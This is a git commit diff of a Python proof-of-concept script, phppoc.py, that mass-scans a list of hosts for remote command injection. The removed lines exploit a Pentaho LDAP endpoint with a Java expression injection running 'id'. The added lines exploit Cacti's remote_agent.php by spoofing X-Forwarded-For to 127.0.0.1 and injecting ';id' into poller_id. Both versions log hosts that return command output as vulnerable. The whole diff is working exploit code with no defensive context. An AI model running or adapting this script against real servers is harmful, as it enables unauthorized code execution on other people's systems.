07e59cdaf36d00983a94fce761fd4dbfc7e4d04c
nethunterforum <132587227+nethunterforum@users.noreply.github.com>
2023-05-09 05:39:43 -0400

    Update phppoc.py

--- phppoc.py
+++ phppoc.py
@@ -1,22 +1,34 @@
 import requests
+import sys
 
-with open("cacti.txt", 'r') as file:
-    for line in file:
-        baseurl = 'http://'+line.strip('\n')+'/pentaho'
-        with open('result1.txt', 'a') as file1:
-            file1.write(baseurl+'\n')
-        file1.close()
-        print(baseurl)
-        url = f"{baseurl}/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{{T(java.lang.Runtime).getRuntime().exec('id')}}&mgrDn=a&pwd=a"
-        try:
-            r = requests.get(url)
-            if r.text == 'false':
-                with open('result3.txt', 'a') as file1:
-                    file1.write(baseurl+'\n')
+
+def main():
+    filea = sys.argv[1]
+
+    with open(filea, 'r') as file:
+        for line in file:
+            host = "http://"+line.strip('\n')
+            headers = {
+                'X-Forwarded-For': '127.0.0.1'
+            }
+
+            try:
+                httpResponse = requests.get(host + '/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;id', headers=headers, verify=False)
+                with open('result1.txt', 'a') as file1:
+                        file1.write(host+"\n")
                 file1.close()
-            if('uid=' in r.text and 'gid=' in r.text):
-                with open('result2.txt', 'a') as file1:
-                    file1.write(baseurl+'\n')
-                file1.close()
-        except:
-            a=0
+                if('uid=' in httpResponse.text and 'gid=' in httpResponse.text):
+                    with open('result2.txt', 'a') as file1:
+                        file1.write(host+'\n')
+                    file1.close()
+                if 'local_data_id' in httpResponse.text:
+                    with open('result3.txt', 'a') as file1:
+                        file1.write(host+" appears to be vulnerable \n")
+                    file1.close()
+            except:
+                a=0
+            
+
+if __name__ == '__main__':
+    main()
+    
